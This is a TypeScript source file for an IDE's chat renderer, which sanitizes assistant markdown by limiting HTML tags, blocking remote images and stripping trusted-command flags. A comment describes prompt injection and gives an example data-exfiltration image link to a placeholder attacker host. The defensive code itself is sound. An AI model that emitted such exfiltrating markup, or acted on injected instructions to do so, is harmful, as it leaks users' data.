/*---------------------------------------------------------------------------------------------
 *  Copyright (c) OpenIDE. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*/

import { $, append } from '../../../../../base/browser/dom.js';
import { Codicon } from '../../../../../base/common/codicons.js';
import { ThemeIcon } from '../../../../../base/common/themables.js';
import { IClipboardService } from '../../../../../platform/clipboard/common/clipboardService.js';
import { allowedMarkdownHtmlAttributes, IRenderedMarkdown, MarkdownRenderOptions } from '../../../../../base/browser/markdownRenderer.js';
import { getDefaultHoverDelegate } from '../../../../../base/browser/ui/hover/hoverDelegateFactory.js';
import { IMarkdownString } from '../../../../../base/common/htmlContent.js';
import { DisposableStore } from '../../../../../base/common/lifecycle.js';
import { IHoverService } from '../../../../../platform/hover/browser/hover.js';
import { IMarkdownRenderer, IMarkdownRendererService } from '../../../../../platform/markdown/browser/markdownRenderer.js';
import product from '../../../../../platform/product/common/product.js';
import { t } from '../../common/openideStrings.js';

/**
 * Tags an assistant turn may produce.
 *
 * Narrower than `allowedMarkdownHtmlTags` (base/browser/markdownRenderer.ts:554) on purpose:
 * `details`, `summary`, `label`, `source` and friends are collapsible/loadable surfaces we never
 * emit, and every tag left in the list is one more thing a prompt injection can try to steer.
 *
 * `input` IS in, and the note that used to say otherwise ("the transcript does not render
 * checkboxes") was simply wrong about what the agent writes: `- [x] …` task lists are how it
 * reports plans and summaries, and marked turns every one of them into `<input type="checkbox">`.
 * With the tag dropped and `replaceWithPlaintext` on, each item rendered as the literal text
 * `<input checked="" disabled="" type="checkbox"> Listar archivos…` — the tag printed instead of
 * drawn. Allowing it costs nothing: `renderMarkdown` post-processes every input, forcing `disabled`
 * on checkboxes and removing any other type (base/browser/markdownRenderer.ts:315-330), and the
 * attribute allowlist below already carries `type`/`checked`/`disabled` for exactly this.
 */
export const OPENIDE_CHAT_ALLOWED_MARKDOWN_TAGS = Object.freeze([
	'a', 'b', 'blockquote', 'br', 'code', 'del', 'em', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'hr',
	'i', 'img', 'input', 'ins', 'kbd', 'li', 'ol', 'p', 'pre', 's', 'strong', 'sub', 'sup',
	'table', 'tbody', 'td', 'th', 'thead', 'tr', 'ul',
	// Codicons and the syntax-highlighted code block markup both need these two.
	'span', 'div',
]);

/**
 * Blocks every remote image. A model that writes `![](https://attacker/pixel?data=…)` would
 * otherwise exfiltrate on render — no click needed — and unlike the old webview there is no CSP
 * in the workbench DOM to stop the request.
 */
const remoteImageIsAllowed = () => false;

const COPY_CODE = t('chat.code.copy');

/**
 * Sanitizer configuration for assistant output.
 *
 * Attributes reuse `allowedMarkdownHtmlAttributes` (base/browser/markdownRenderer.ts:559) rather
 * than a hand-written list: it already restricts `style` to a colour regex and `class` to
 * codicons, and a local copy would silently rot the day upstream tightens it.
 */
export function getOpenideChatMarkdownRenderOptions(options?: MarkdownRenderOptions): MarkdownRenderOptions {
	return {
		...options,
		sanitizerConfig: {
			// Dropped markup is shown as text instead of vanishing, so a mangled answer is
			// visibly mangled rather than quietly missing a sentence.
			replaceWithPlaintext: true,
			allowedTags: { override: OPENIDE_CHAT_ALLOWED_MARKDOWN_TAGS },
			allowedAttributes: { override: allowedMarkdownHtmlAttributes },
			...options?.sanitizerConfig,
			allowedLinkSchemes: { augment: [product.urlProtocol] },
			remoteImageIsAllowed,
		},
	};
}

/**
 * Strips the two flags that turn markdown into an execution surface.
 *
 * `isTrusted` is what lets `command:` links through `openLinkFromMarkdown`
 * (platform/markdown/browser/markdownRenderer.ts:89-101), i.e. arbitrary workbench commands from
 * one link click. `supportHtml` makes marked emit the model's raw HTML and leaves the sanitizer
 * as the only line of defence. Model output gets neither, whatever the producer set.
 */
export function asUntrustedChatMarkdown(markdown: IMarkdownString): IMarkdownString {
	if (!markdown.isTrusted && !markdown.supportHtml) {
		return markdown;
	}
	return { ...markdown, isTrusted: false, supportHtml: false };
}

/**
 * Renders assistant markdown through `IMarkdownRendererService`.
 *
 * The service is a registered singleton (platform/markdown/browser/markdownRenderer.ts:115) and
 * the workbench installs a tokenizing code block renderer on it at startup
 * (workbench/browser/workbench.ts:152), so fenced code arrives syntax highlighted for free —
 * asynchronously, which is why callers must wire `asyncRenderCallback` to a height signal.
 */
export class OpenideChatMarkdownRenderer implements IMarkdownRenderer {

	constructor(
		@IMarkdownRendererService private readonly _markdownRendererService: IMarkdownRendererService,
		@IHoverService private readonly _hoverService: IHoverService,
		@IClipboardService private readonly _clipboardService: IClipboardService,
	) { }

	render(markdown: IMarkdownString, options?: MarkdownRenderOptions, outElement?: HTMLElement): IRenderedMarkdown {
		const result = this._markdownRendererService.render(
			asUntrustedChatMarkdown(markdown),
			getOpenideChatMarkdownRenderOptions(options),
			outElement,
		);
		this._decorateCodeBlocks(result.element);

		// marked can leave bare text nodes at the top level; the transcript's spacing comes from
		// paragraph margins, so unwrapped text collapses against the row above it.
		result.element.normalize();
		for (const child of Array.from(result.element.childNodes)) {
			if (child.nodeType === Node.TEXT_NODE && child.textContent?.trim()) {
				child.replaceWith($('p', undefined, child.textContent));
			}
		}

		return this._attachLinkHovers(result);
	}

	/**
	 * The copy button of every fenced block (the webview's `.code-copy`, openideChatHtml.ts:6193).
	 *
	 * The placeholder `div[data-code]` (the sanitizer strips its `code` class) is the element the async tokenizer writes INTO
	 * (`DOM.reset`), so the button cannot live inside it: it is wrapped instead, and the raw source
	 * is captured here while the placeholder still holds the escaped text — the tokenized markup
	 * that replaces it loses the line structure.
	 */
	private _decorateCodeBlocks(root: HTMLElement): void {
		// eslint-disable-next-line no-restricted-syntax
		for (const code of Array.from(root.querySelectorAll<HTMLElement>('div[data-code]'))) {
			if (code.parentElement?.classList.contains('openide-chat-codeblock')) {
				continue;
			}
			const source = code.textContent ?? '';
			const wrapper = $('.openide-chat-codeblock');
			code.replaceWith(wrapper);
			wrapper.appendChild(code);
			const button = append(wrapper, $('button.openide-chat-codeblock-copy')) as HTMLButtonElement;
			button.type = 'button';
			button.title = COPY_CODE;
			button.setAttribute('aria-label', COPY_CODE);
			append(button, $(`span.${ThemeIcon.asClassName(Codicon.copy).replace(/ /g, '.')}`));
			button.addEventListener('click', event => {
				event.preventDefault();
				event.stopPropagation();
				void this._clipboardService.writeText(source).then(() => {
					button.classList.add('copied');
					setTimeout(() => button.classList.remove('copied'), 1200);
				});
			});
		}
	}

	/**
	 * Moves native `title` tooltips onto the workbench hover, which is themed and, unlike the
	 * browser tooltip, cannot be used to paint text outside the window.
	 */
	private _attachLinkHovers(result: IRenderedMarkdown): IRenderedMarkdown {
		const store = new DisposableStore();
		// eslint-disable-next-line no-restricted-syntax
		for (const anchor of result.element.querySelectorAll('a')) {
			if (anchor.title) {
				const title = anchor.title;
				anchor.title = '';
				store.add(this._hoverService.setupManagedHover(getDefaultHoverDelegate('element'), anchor, title));
			}
		}

		return {
			element: result.element,
			dispose: () => {
				result.dispose();
				store.dispose();
			},
		};
	}
}
